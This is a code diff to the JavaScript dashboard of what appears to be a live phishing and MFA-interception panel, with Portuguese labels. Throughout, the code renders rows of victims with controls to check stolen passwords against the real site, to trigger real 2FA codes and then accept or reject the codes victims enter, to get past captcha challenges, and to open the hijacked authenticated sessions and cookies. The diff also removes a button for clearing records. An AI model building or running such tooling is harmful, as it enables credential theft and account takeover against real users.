@@ -27,7 +27,6 @@ const tabAuditoria = document.getElementById("tab-auditoria");
 let dadosAuditoria = [];
 let statsAuditoria = null;
 const btnAtualizar = document.getElementById("btn-atualizar");
-const btnLimpar = document.getElementById("btn-limpar");
 const btnToggleAuto = document.getElementById("btn-toggle-auto");
 const autoModeLabel = document.getElementById("auto-mode-label");
 const modalCookies = document.getElementById("modal-cookies");
@@ -577,51 +576,75 @@ function renderizarTabela() {
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                 <span>Remota</span>
               </a>
-              ${tem2FA ? `
-                <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
-                  <span>Aceitar</span>
-                </button>
-                <button class="btn-danger-sm" type="button" title="Negar código e solicitar que a vítima digite novamente" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-                  <span>Negar</span>
-                </button>
-              ` : (
-                stLogin === "solicitar_2fa" ? `
-                  <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.7;" disabled title="2FA já foi solicitado, aguardando vítima digitar">
+              ${tem2FA ? (
+                (st2FA === "aceito" || item.status === "2FA Aceito" || sessaoConcluida) ? `
+                  <button class="btn-success-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="2FA já aceito com sucesso">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceito</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" disabled style="opacity: 0.35; cursor: not-allowed;" title="Operação indisponível: Sessão já autenticada com sucesso">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negar</span>
+                  </button>
+                ` : (st2FA === "negado" ? `
+                  <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceitar</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Código 2FA já foi negado (aguardando novo código da vítima)">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negado</span>
+                  </button>
+                ` : `
+                  <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceitar</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" title="Negar código e solicitar que a vítima digite novamente" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negar</span>
+                  </button>
+                `)
+              ) : (
+                sessaoConcluida ? `
+                  <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Operação indisponível: Sessão já autenticada e concluída">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Sessão Pronta</span>
+                  </button>
+                ` : (stLogin === "solicitar_2fa" ? `
+                  <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.65; cursor: not-allowed;" disabled title="2FA já foi solicitado, aguardando vítima digitar">
                     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                     <span>Aguardando Código</span>
                   </button>
-                ` : (
-                  item.status_credencial === "bloqueio_captcha" ? `
-                    <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="A VR apresentou desafio Cloudflare Turnstile. Clique para resolver e re-tentar no SSO." onclick="retestarSSO('${escapeQuotes(item.usuario)}')">
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
-                      <span>Resolver Captcha</span>
-                    </button>
-                    <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: A VR não gerou código MFA real." onclick="abrirModalForcar2FA('${escapeQuotes(item.usuario)}')">
-                      <span>Forçar 2FA</span>
-                    </button>
-                  ` : (
-                    item.status_credencial === "invalido" ? `
-                      <button class="btn-danger-sm" type="button" title="A VR indicou que a senha está incorreta." onclick="abrirModalForcar2FA('${escapeQuotes(item.usuario)}')">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                        <span>Forçar 2FA (Inválido)</span>
-                      </button>
-                    ` : (
-                      item.status_credencial === "valido" ? `
-                        <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
-                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                          <span>Solicitar 2FA</span>
-                        </button>
-                      ` : `
-                        <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
-                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                          <span>Solicitar 2FA</span>
-                        </button>
-                      `
-                    )
-                  )
-                )
+                ` : (item.status_credencial === "testando" ? `
+                  <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação de credenciais em andamento na VR...">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                    <span>Testando na VR</span>
+                  </button>
+                ` : (item.status_credencial === "invalido" ? `
+                  <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Operação indisponível: Senha incorreta confirmada na VR (aguardando nova senha da vítima)">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Senha Incorreta</span>
+                  </button>
+                ` : (item.status_credencial === "bloqueio_captcha" ? `
+                  <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="A VR apresentou desafio Cloudflare Turnstile. Clique para resolver e re-tentar no SSO." onclick="retestarSSO('${escapeQuotes(item.usuario)}')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
+                    <span>Resolver Captcha</span>
+                  </button>
+                  <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: A VR não gerou código MFA real." onclick="abrirModalForcar2FA('${escapeQuotes(item.usuario)}')">
+                    <span>Forçar 2FA</span>
+                  </button>
+                ` : (item.status_credencial === "valido" ? `
+                  <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    <span>Solicitar 2FA</span>
+                  </button>
+                ` : `
+                  <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    <span>Solicitar 2FA</span>
+                  </button>
+                `))))
               )}
               ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
                 <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 5px 10px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(2, 215, 47, 0.35);" title="Acessar Sessão Autenticada Finalizada">
@@ -748,22 +771,58 @@ function renderizarTabela() {
                 <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                 <span>Remota</span>
               </a>
-              ${is2FA ? `
-                <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
-                  <span>Aceitar</span>
-                </button>
-                <button class="btn-danger-sm" type="button" title="Negar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-                  <span>Negar</span>
-                </button>
-              ` : (
-                item.status_login !== "solicitar_2fa" ? `
+              ${is2FA ? (
+                (item.status_2fa === "aceito" || item.status === "2FA Aceito") ? `
+                  <button class="btn-success-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="2FA já aceito com sucesso">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceito</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" disabled style="opacity: 0.35; cursor: not-allowed;" title="Operação indisponível: Sessão já autenticada com sucesso">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negar</span>
+                  </button>
+                ` : (item.status_2fa === "negado" ? `
+                  <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceitar</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Código 2FA já negado (aguardando novo código)">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negar</span>
+                  </button>
+                ` : `
+                  <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Aceitar</span>
+                  </button>
+                  <button class="btn-danger-sm" type="button" title="Negar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    <span>Negar</span>
+                  </button>
+                `)
+              ) : (
+                (item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
+                  <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Sessão já autenticada e concluída">
+                    <span>Concluído</span>
+                  </button>
+                ` : (item.status_login === "solicitar_2fa" ? `
+                  <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.65; cursor: not-allowed;" disabled title="2FA já solicitado, aguardando vítima digitar">
+                    <span>2FA Solicitado</span>
+                  </button>
+                ` : (item.status_credencial === "testando" ? `
+                  <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação em andamento na VR...">
+                    <span>Testando</span>
+                  </button>
+                ` : (item.status_credencial === "invalido" ? `
+                  <button class="btn-danger-sm" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Senha incorreta confirmada na VR">
+                    <span>Senha Incorreta</span>
+                  </button>
+                ` : `
                   <button class="btn-primary-sm" type="button" title="Solicitar 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
                     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                     <span>Pedir 2FA</span>
                   </button>
-                ` : ''
+                `)))
               )}
               ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
                 <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 4px 8px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
@@ -851,25 +910,6 @@ if (btnAtualizar) {
   });
 }
 
-if (btnLimpar) {
-  btnLimpar.addEventListener("click", async () => {
-    try {
-      const res = await fetch("/api/limpar", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ tenant: tenantAtivo || undefined })
-      });
-      const json = await res.json();
-      if (json.success) {
-        showToast(tenantAtivo ? `Registros do tenant '${tenantAtivo}' limpos!` : "Todos os registros limpos!");
-        carregarDados();
-        carregarTenants();
-      }
-    } catch (err) {
-      console.error(err);
-    }
-  });
-}
 
 if (seletorTenant) {
   seletorTenant.addEventListener("change", () => {
